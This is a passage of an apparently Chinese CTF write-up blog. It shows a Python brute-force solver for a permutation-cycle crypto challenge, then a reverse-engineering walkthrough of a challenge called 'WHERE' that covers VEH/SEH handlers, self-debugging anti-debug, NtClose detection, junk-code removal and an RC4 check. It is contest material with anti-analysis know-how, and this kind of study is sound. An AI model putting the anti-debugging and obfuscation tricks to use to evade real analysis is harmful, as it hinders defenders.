class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):</span><br><span class="line">    P2[i] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_Chain</span>(<span class="params">P2</span>):</span><br><span class="line">Chain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):</span><br><span class="line">head = i</span><br><span class="line">chain = [head]</span><br><span class="line">c = P2[head]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):</span><br><span class="line">chain.append(c)</span><br><span class="line">c = P2[c]</span><br><span class="line"><span class="keyword">if</span> c == head:</span><br><span class="line"><span class="keyword">if</span> chain <span class="keyword">not</span> <span class="keyword">in</span> Chain:</span><br><span class="line">lag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Chain)):</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> chain:</span><br><span class="line"><span class="keyword">if</span> l <span class="keyword">in</span> Chain[k]:</span><br><span class="line">lag = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> lag == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(chain) == <span class="number">2</span>:</span><br><span class="line">Chain.append(chain[:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">Chain.append(chain)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> Chain</span><br><span class="line"></span><br><span class="line">Chain = find_Chain(P2)</span><br><span class="line"><span class="built_in">print</span>(Chain)</span><br><span class="line">LEN = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Chain:</span><br><span class="line">    LEN.append(<span class="built_in">len</span>(line))</span><br><span class="line"></span><br><span class="line">LEN = <span class="built_in">sorted</span>(LEN)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(LEN)</span><br><span class="line"></span><br><span class="line">chain64_1 = [<span class="number">0</span>, <span class="number">81</span>, <span class="number">136</span>, <span class="number">63</span>, <span class="number">11</span>, <span class="number">151</span>, <span class="number">65</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">227</span>, <span class="number">76</span>, <span class="number">244</span>, <span class="number">212</span>, <span class="number">139</span>, <span class="number">201</span>, <span class="number">91</span>, <span class="number">15</span>, <span class="number">135</span>, <span class="number">20</span>, <span class="number">224</span>, <span class="number">46</span>, <span class="number">164</span>, <span class="number">42</span>, <span class="number">74</span>, <span class="number">167</span>, <span class="number">219</span>, <span class="number">62</span>, <span class="number">189</span>, <span class="number">111</span>, <span class="number">241</span>, <span class="number">211</span>, <span class="number">10</span>, <span class="number">170</span>, <span class="number">215</span>, <span class="number">223</span>, <span class="number">246</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">207</span>, <span class="number">9</span>, <span class="number">146</span>, <span class="number">249</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">60</span>, <span class="number">72</span>, <span class="number">67</span>, <span class="number">156</span>, <span class="number">195</span>, <span class="number">206</span>, <span class="number">132</span>, <span class="number">97</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">98</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">130</span>, <span class="number">51</span>, <span class="number">58</span>, <span class="number">177</span>, <span class="number">240</span>]</span><br><span class="line">chain64_2 = [<span class="number">1</span>, <span class="number">236</span>, <span class="number">50</span>, <span class="number">172</span>, <span class="number">138</span>, <span class="number">14</span>, <span class="number">169</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">197</span>, <span class="number">181</span>, <span class="number">159</span>, <span class="number">32</span>, <span class="number">55</span>, <span class="number">141</span>, <span class="number">54</span>, <span class="number">30</span>, <span class="number">221</span>, <span class="number">57</span>, <span class="number">226</span>, <span class="number">43</span>, <span class="number">37</span>, <span class="number">26</span>, <span class="number">254</span>, <span class="number">203</span>, <span class="number">193</span>, <span class="number">38</span>, <span class="number">71</span>, <span class="number">27</span>, <span class="number">59</span>, <span class="number">225</span>, <span class="number">153</span>, <span class="number">106</span>, <span class="number">149</span>, <span class="number">214</span>, <span class="number">84</span>, <span class="number">110</span>, <span class="number">129</span>, <span class="number">239</span>, <span class="number">137</span>, <span class="number">216</span>, <span class="number">229</span>, <span class="number">100</span>, <span class="number">150</span>, <span class="number">24</span>, <span class="number">73</span>, <span class="number">235</span>, <span class="number">40</span>, <span class="number">200</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">120</span>, <span class="number">178</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">251</span>, <span class="number">220</span>, <span class="number">45</span>, <span class="number">176</span>, <span class="number">238</span>, <span class="number">154</span>, <span class="number">194</span>]</span><br><span class="line">chain29_1 = [<span class="number">4</span>, <span class="number">29</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">64</span>, <span class="number">102</span>, <span class="number">147</span>, <span class="number">77</span>, <span class="number">92</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">56</span>, <span class="number">162</span>, <span class="number">140</span>, <span class="number">205</span>, <span class="number">23</span>, <span class="number">124</span>, <span class="number">96</span>, <span class="number">232</span>, <span class="number">25</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">123</span>, <span class="number">234</span>, <span class="number">252</span>, <span class="number">112</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">93</span>]</span><br><span class="line">chain29_2 = [<span class="number">7</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">79</span>, <span class="number">121</span>, <span class="number">204</span>, <span class="number">99</span>, <span class="number">187</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">142</span>, <span class="number">243</span>, <span class="number">202</span>, <span class="number">182</span>, <span class="number">89</span>, <span class="number">174</span>, <span class="number">145</span>, <span class="number">52</span>, <span class="number">209</span>, <span class="number">233</span>, <span class="number">242</span>, <span class="number">19</span>, <span class="number">158</span>, <span class="number">173</span>, <span class="number">94</span>, <span class="number">217</span>, <span class="number">133</span>, <span class="number">85</span>, <span class="number">17</span>]</span><br><span class="line">chain20_1 = [<span class="number">3</span>, <span class="number">82</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">185</span>, <span class="number">180</span>, <span class="number">12</span>, <span class="number">192</span>, <span class="number">248</span>, <span class="number">108</span>, <span class="number">166</span>, <span class="number">210</span>, <span class="number">28</span>, <span class="number">186</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">165</span>, <span class="number">184</span>, <span class="number">122</span>, <span class="number">8</span>]</span><br><span class="line">chain20_2 = [<span class="number">5</span>, <span class="number">199</span>, <span class="number">61</span>, <span class="number">255</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">168</span>, <span class="number">114</span>, <span class="number">41</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">35</span>, <span class="number">228</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">107</span>, <span class="number">175</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">21</span>]</span><br><span class="line">chain9_1 = [<span class="number">39</span>, <span class="number">196</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">128</span>, <span class="number">75</span>, <span class="number">208</span>, <span class="number">116</span>, <span class="number">231</span>]</span><br><span class="line">chain9_2 = [<span class="number">68</span>, <span class="number">218</span>, <span class="number">188</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">183</span>, <span class="number">222</span>, <span class="number">230</span>]</span><br><span class="line">chain4_1 = [<span class="number">22</span>, <span class="number">179</span>, <span class="number">198</span>, <span class="number">144</span>]</span><br><span class="line">chain4_2 = [<span class="number">49</span>, <span class="number">171</span>, <span class="number">250</span>, <span class="number">118</span>]</span><br><span class="line">chain3 = [<span class="number">87</span>, <span class="number">105</span>, <span class="number">247</span>]</span><br><span class="line">chain1 = [<span class="number">191</span>]</span><br><span class="line"></span><br><span class="line">dictionary = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">singlering</span>(<span class="params">chain</span>):</span><br><span class="line">    new = [<span class="number">0</span>]*<span class="built_in">len</span>(chain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chain)):</span><br><span class="line">        new[i*<span class="number">2</span>%<span class="built_in">len</span>(chain)] = chain[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chain)):</span><br><span class="line">        dictionary[new[i]] = new[(i+<span class="number">1</span>)%<span class="built_in">len</span>(chain)] <span class="comment"># map</span></span><br><span class="line"></span><br><span class="line">singlering(chain1)</span><br><span class="line">singlering(chain3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 大循环嵌套</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    ring_128 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            ring_128[j] = chain64_1[j//<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ring_128[j] = chain64_2[(j//<span class="number">2</span>+i1)%<span class="number">64</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        dictionary[ring_128[j]] = ring_128[(j+<span class="number">1</span>)%<span class="number">128</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">        ring_58 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>)]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>):</span><br><span class="line">            <span class="keyword">if</span>(j%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">                ring_58[j] = chain29_1[j//<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ring_58[j] = chain29_2[(j//<span class="number">2</span>+i2)%<span class="number">29</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>):</span><br><span class="line">            dictionary[ring_58[j]] = ring_58[(j+<span class="number">1</span>)%<span class="number">58</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            ring_40 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">                <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                    ring_40[j] = chain20_1[j//<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ring_40[j] = chain20_2[(j//<span class="number">2</span>+i3)%<span class="number">20</span>]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">                dictionary[ring_40[j]] = ring_40[(j+<span class="number">1</span>)%<span class="number">40</span>]</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                ring_18 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">                    <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                        ring_18[j] = chain9_1[j//<span class="number">2</span>]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        ring_18[j] = chain9_2[(j//<span class="number">2</span> + i4)%<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">                    dictionary[ring_18[j]] = ring_18[(j+<span class="number">1</span>)%<span class="number">18</span>]</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    ring_8 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                            ring_8[j] = chain4_1[j//<span class="number">2</span>]</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            ring_8[j] = chain4_2[(j//<span class="number">2</span>+i5)%<span class="number">4</span>]</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        dictionary[ring_8[j]] = ring_8[(j+<span class="number">1</span>)%<span class="number">8</span>]</span><br><span class="line">                        </span><br><span class="line">                    M = [dictionary[j]+<span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">                    mask = P(M)</span><br><span class="line">                    mul = P(mul)</span><br><span class="line">                    _<span class="built_in">hash</span> = sha512(<span class="built_in">str</span>(mask).encode()).hexdigest()</span><br><span class="line">                    mask_hash = <span class="string">&quot;91881f508f08fbafec1a6879fc3a1f215135c94c78f03fae8534d54dc05bd4a122a4e4508d32b9e02be08fbbb42a9e3335fc433c20e2da2e012d11b7324f6952&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> _<span class="built_in">hash</span> == mask_hash:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;P= <span class="subst">&#123;mask&#125;</span>&quot;</span>)</span><br><span class="line">                        temp = sha512(<span class="built_in">str</span>(mask * mul).encode()).hexdigest()</span><br><span class="line">                        <span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">                        flag = msg ^ <span class="built_in">int</span>(temp,<span class="number">16</span>)</span><br><span class="line">                        <span class="built_in">print</span>(n2s(<span class="built_in">int</span>(flag)))</span><br></pre></td></tr></table></figure><p>这题写的时候出了好多bug… 以后有空再自己写一遍</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h2><p>挺好的题的 只是为什么我的 <code>byte_41C0A0</code> 怎么都找不到值啊…<br>除开这点(就是得不到flag罢了) 还是有些知识点值得记录下的<br>考点: 花指令 异常处理<br>VEH和SEH的区别： SEH是基于线程的 而 VEH是基于进程的</p><p>IDA打开<br>main开头就有个<br><code>ExceptionList = NtCurrentTeb()-&gt;NtTib.ExceptionList;</code><br>继续分析main</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AddVectoredExceptionHandler = (PVOID (__stdcall *)(ULONG, PVECTORED_EXCEPTION_HANDLER))GetProcAddress(</span><br><span class="line">                                                                                         hModule,</span><br><span class="line">                                                                                         &quot;AddVectoredExceptionHandler&quot;);</span><br><span class="line">AddVectoredExceptionHandler(0, Handler);</span><br><span class="line">if ( !sub_401350(ExceptionList, &amp;loc_401660) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_401520();</span><br><span class="line">  ExitProcess(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里add VEH 后进行了调试检测 有个很有趣的点:<br>sub_401520点进去是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">sub_401520</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> <span class="title">DebugEvent</span>;</span> <span class="comment">// [esp+4Ch] [ebp-4B8h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+B0h] [ebp-454h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+F4h] [ebp-410h] BYREF</span></span><br><span class="line">  CHAR Filename[<span class="number">1024</span>]; <span class="comment">// [esp+104h] [ebp-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo.lpReserved, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !CreateProcessA(Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">    sub_4013C0(<span class="number">404</span>);</span><br><span class="line">  sub_4013C0(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;DebugEvent, <span class="number">0</span>, <span class="keyword">sizeof</span>(DebugEvent));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, dwContinueStatus);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是如果我们没有调试的话它就自己启动了一个自调试<br>继续看<br>首先要输入一个v15 进行了一系列约束check 很容易爆破出flag1&#x3D;20220222<br>接下来输入Str check长度为32后 触发了一个异常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         0xC0000005     </span><br><span class="line">程序企图读写一个不可访问的地址时引发的异常。例如企图读取0地址处的内存</span><br></pre></td></tr></table></figure><p>这里的异常会被VEH处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">LONG __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // eax</span><br><span class="line">  DWORD Value; // [esp+50h] [ebp-508h]</span><br><span class="line">  char v4[256]; // [esp+54h] [ebp-504h] BYREF</span><br><span class="line">  char *Source; // [esp+154h] [ebp-404h]</span><br><span class="line">  char Destination[256]; // [esp+158h] [ebp-400h] BYREF</span><br><span class="line">  char Str[256]; // [esp+258h] [ebp-300h] BYREF</span><br><span class="line">  char v8[256]; // [esp+358h] [ebp-200h] BYREF</span><br><span class="line">  char v9[256]; // [esp+458h] [ebp-100h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(v9, 0, sizeof(v9));</span><br><span class="line">  memset(v8, 0, sizeof(v8));</span><br><span class="line">  memset(Str, 0, sizeof(Str));</span><br><span class="line">  memset(v4, 0, sizeof(v4));</span><br><span class="line">  Source = (char *)ExceptionInfo-&gt;ContextRecord-&gt;Edx;</span><br><span class="line">  Value = ExceptionInfo-&gt;ContextRecord-&gt;Eax;</span><br><span class="line">  if ( ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode != 0xC0000005 )</span><br><span class="line">    return 0;</span><br><span class="line">  strcpy(Destination, Source);</span><br><span class="line">  _itoa(Value, Str, 8);</span><br><span class="line">  v1 = strlen(Str);</span><br><span class="line">  sub_401080(v9, v8, Str, v1);</span><br><span class="line">  sub_4010F0(v9, v8);</span><br><span class="line">  sub_4011A0(v9, Str, 256);</span><br><span class="line">  sub_4012A0(Str, Destination, Source, 32);</span><br><span class="line">  ExceptionInfo-&gt;ContextRecord-&gt;Eip += 6;</span><br><span class="line">  return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到Source来自edx指向的值<br>而这里可以看到 edx确实指向了Str</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401D6F                 lea     ecx, [ebp+Str]</span><br><span class="line">.text:00401D75                 mov     [ebp+var_8], ecx</span><br><span class="line">.text:00401D78                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:00401D7B                 mov     eax, [ebp+var_14]</span><br></pre></td></tr></table></figure><p>这一段点进去查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v1 = strlen(Str);</span><br><span class="line">  sub_401080(v9, v8, Str, v1);</span><br><span class="line">  sub_4010F0(v9, v8);</span><br><span class="line">  sub_4011A0(v9, Str, 256);</span><br><span class="line">  sub_4012A0(Str, Destination, Source, 32);</span><br></pre></td></tr></table></figure><p>会发现是个RC4加了一点xor<br>处理完异常后 发现下面又有一句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtClose = (NTSTATUS (__stdcall *)(HANDLE))GetProcAddress(::hModule, &quot;NtClose&quot;);</span><br></pre></td></tr></table></figure><p>这是为什么呢?<br>新知识:</p><ul><li>调用NtClose 会释放一个无效句柄 如果没有被调试返回FALSE 否则抛出异常 0xC0000008</li></ul><p>这就是为什么前面要启动自调试 就是为了在这里抛出异常 被SEH捕获<br>转到开头SEH的地方<br>细心查看这里会发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401B2C                 rep stosd</span><br><span class="line">.text:00401B2E                 lea     eax, loc_401660</span><br><span class="line">.text:00401B34                 push    eax</span><br><span class="line">.text:00401B35                 mov     eax, large fs:0</span><br><span class="line">.text:00401B3B                 push    eax</span><br></pre></td></tr></table></figure><p>这里调用了loc_401660<br>点击跳转会发现这是一个加了花指令的函数 没有被IDA正常识别<br>观察发现有 junk code </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00401678                 jz      short near ptr loc_40167C+1</span><br><span class="line">.text:0040167A                 jnz     short near ptr loc_40167C+1</span><br><span class="line">.text:0040167C</span><br><span class="line">.text:0040167C loc_40167C:                             ; CODE XREF: .text:00401678↑j</span><br><span class="line">.text:0040167C                                         ; .text:0040167A↑j</span><br><span class="line">.text:0040167C                 call    near ptr 13C5C48h</span><br><span class="line">.text:0040167C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401681                 db 3 dup(0)</span><br></pre></td></tr></table></figure><p>全部nop掉 C一C P一P就能F5了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401660</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// 